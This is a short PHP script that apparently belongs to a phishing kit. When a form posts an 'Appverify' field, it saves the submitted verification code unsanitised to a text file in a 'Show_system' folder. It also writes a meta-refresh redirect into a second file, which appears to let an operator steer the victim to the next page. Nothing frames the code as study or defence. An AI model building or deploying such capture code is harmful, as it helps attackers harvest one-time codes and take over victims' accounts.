<?php


session_start();

if(isset($_POST['Appverify'])) 
{
    
$Page .= ' <meta http-equiv="refresh" content="0;url=./papp.php" /> ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);



$textimage = $_SESSION['textAppverify'] = $_POST['textAppverify'];

$yagmai .= ''.$textimage.'';
                      
$f = fopen("../Show_system/Show_Appverify.txt", "w");
    fwrite($f, $yagmai);




}

else {




}

?>

